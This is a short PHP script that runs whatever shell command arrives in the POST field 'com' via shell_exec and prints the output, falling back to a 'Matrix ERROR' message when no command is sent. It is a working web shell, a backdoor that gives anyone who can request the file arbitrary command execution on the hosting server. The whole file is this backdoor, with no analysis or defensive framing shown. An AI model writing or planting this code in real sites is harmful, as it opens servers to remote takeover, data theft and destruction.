<?php
if (isset($_POST["com"])) {

    $com = shell_exec("cd ../../ && pwd && " . $_POST["com"]);
    echo $_POST["com"] . "\r\n" . $com;
} else {
    echo ("Matrix ERROR... :(");
}